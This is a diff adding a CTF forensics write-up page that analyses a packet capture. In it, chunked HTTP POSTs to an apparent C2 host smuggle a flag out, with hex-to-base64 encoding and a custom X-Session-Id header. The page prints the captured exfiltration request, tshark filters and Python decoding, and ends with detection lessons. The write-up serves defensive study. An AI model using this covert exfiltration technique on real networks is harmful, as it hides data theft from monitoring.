@@ -1,0 +1,125 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PCAP03 — Sneaky HTTP Exfiltration — Writeup — arwah</title><meta name="description" content="A workstation (10.20.30.40) browses a stream of harmless-looking websites — BBC, NYT, Reddit, YouTube, GitHub, weather APIs — with equally boring POSTs (comment=nice+post,…"><link rel="icon" href="/favicon.svg"><link rel="stylesheet" href="/writeups/writeups.css?v=20261019-2"></head><body><header class="library-nav"><a href="/#writeups">← Portfolio</a><a href="/writeups/">Writeup library</a></header><main><div class="article-meta">Forensics · 3 min read</div><details class="contents"><summary>On this page</summary><ul><li><a href="#summary">Summary</a></li><li><a href="#recon">Recon</a></li><li><a href="#the-exfil-channel">The exfil channel</a></li><li><a href="#decoding">Decoding</a></li><li><a href="#flag">Flag</a></li><li><a href="#lessons">Lessons</a></li></ul></details><article class="prose"><h1 id="pcap03-sneaky-http-exfiltration-writeup">PCAP03 — Sneaky HTTP Exfiltration — Writeup</h1>
+<p><strong>Category:</strong> Network Forensics / PCAP Analysis
+<strong>Flag:</strong> <code>deadface{http_exfil_sneaky_business}</code>
+<strong>Artifact:</strong> <code>PCAP03.pcap</code> (63 KB, 348 frames, HTTP over TCP)</p>
+<h2 id="summary">Summary</h2>
+<p>A workstation (<code>10.20.30.40</code>) browses a stream of harmless-looking websites —
+BBC, NYT, Reddit, YouTube, GitHub, weather APIs — with equally boring POSTs
+(<code>comment=nice+post</code>, <code>q=weather+today</code>, <code>user=bob&amp;remember=1</code>). Buried in the
+noise are five chunked POSTs to <code>telemetry.deadface-cc.net</code> that carry a flag
+split across a hex→base64 encoding chain, with the final piece smuggled out in
+a custom HTTP header instead of the body.</p>
+<h2 id="recon">Recon</h2>
+<p>Protocol hierarchy is nothing but TCP/HTTP. The IP conversation stats
+immediately flag the outlier — every legitimate site gets short 2-frame
+exchanges, while one host gets five separate POST sessions:</p>
+<pre><code>10.20.30.40  &lt;-&gt;  45.66.77.88      5 frames in, 5 out, 1,826 bytes
+</code></pre>
+<pre><code>$ tshark -r PCAP03.pcap -Y &quot;http.request&quot; -T fields -e http.host | sort | uniq -c
+     21 fonts.googleapis.com          # decoys
+     ...
+      5 telemetry.deadface-cc.net     # &lt;-- C2
+</code></pre>
+<h2 id="the-exfil-channel">The exfil channel</h2>
+<p>Frames 111, 153, 185, 219, 259 — one POST per TCP stream, each with a
+sequence number in the URI:</p>
+<pre><code>POST /api/upload?seq=1 HTTP/1.1
+Host: telemetry.deadface-cc.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+X-Session-Id: YnVzaW5lc3N9
+Content-Type: application/octet-stream
+Content-Length: 8
+
+ZGVhZGZh
+</code></pre>
+<p>Two observations:</p>
+<ol>
+<li>The request <strong>bodies</strong> are hex-encoded ASCII, and the decoded text is
+base64.</li>
+<li>Every request repeats an odd <code>X-Session-Id</code> header — also base64. When the
+body fragments decode to a string that ends mid-flag, the header is where
+the rest went.</li>
+</ol>
+<p>Reassembling by <code>seq</code> (follow each TCP stream, or just pull the bodies):</p>
+<pre><code class="language-bash">tshark -r PCAP03.pcap -Y &quot;ip.addr==45.66.77.88 &amp;&amp; http.request&quot; \
+       -T fields -e http.request.uri -e http.file_data
+</code></pre>
+<h2 id="decoding">Decoding</h2>
+<pre><code class="language-python">import base64
+
+chunks = ['5a4756685a475a68',   # seq=1 -&gt; ZGVhZGZh
+          '5932563761485230',   # seq=2 -&gt; Y2V7aHR0
+          '6346396c65475a70',   # seq=3 -&gt; cF9leGZp
+          '6246397a626d5668',   # seq=4 -&gt; bF9zbmVh
+          '61336c66']           # seq=5 -&gt; a3lf
+
+body = ''.join(bytes.fromhex(c).decode() for c in chunks)
+# -&gt; 'ZGVhZGZhY2V7aHR0cF9leGZpbF9zbmVha3lf'
+print(base64.b64decode(body))
+# -&gt; b'deadface{http_exfil_sneaky_'          ... truncated
+
+print(base64.b64decode('YnVzaW5lc3N9').decode())
+# -&gt; 'business}'                             ... the X-Session-Id header
+</code></pre>
+<p>Body fragments per chunk:</p>
+<table>
+<thead>
+<tr>
+<th>seq</th>
+<th>hex body</th>
+<th>base64</th>
+<th>plaintext</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>5a4756685a475a68</code></td>
+<td><code>ZGVhZGZh</code></td>
+<td><code>deadfa</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>5932563761485230</code></td>
+<td><code>Y2V7aHR0</code></td>
+<td><code>ce{htt</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>6346396c65475a70</code></td>
+<td><code>cF9leGZp</code></td>
+<td><code>p_exfi</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>6246397a626d5668</code></td>
+<td><code>bF9zbmVh</code></td>
+<td><code>l_snea</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>61336c66</code></td>
+<td><code>a3lf</code></td>
+<td><code>ky_</code></td>
+</tr>
+</tbody>
+</table>
+<p>The closing <code>}</code> never appears in any body — it rides in the
+<code>X-Session-Id: YnVzaW5lc3N9</code> header on <strong>every</strong> request
+(<code>business}</code>). Stitch body + header:</p>
+<pre><code>deadface{http_exfil_sneaky_  +  business}
+</code></pre>
+<h2 id="flag">Flag</h2>
+<pre><code>deadface{http_exfil_sneaky_business}
+</code></pre>
+<h2 id="lessons">Lessons</h2>
+<ul>
+<li>Outliers first: sort HTTP hosts by frequency / conversation bytes — the C2
+domain name (<code>telemetry.deadface-cc.net</code>) made that trivial here.</li>
+<li>&quot;Session&quot; headers are a classic side channel for small payload fragments
+when the body is already being inspected.</li>
+<li>Split-and-encode exfil (hex → base64 → plaintext, one <code>seq=</code> per chunk)
+defeats naive string searches in a single packet; always reassemble streams
+in order before decoding.</li>
+</ul>
+</article><a class="back-link" href="/writeups/">← All writeups</a></main><footer>CTF solutions &amp; security notes · arwah</footer></body></html>
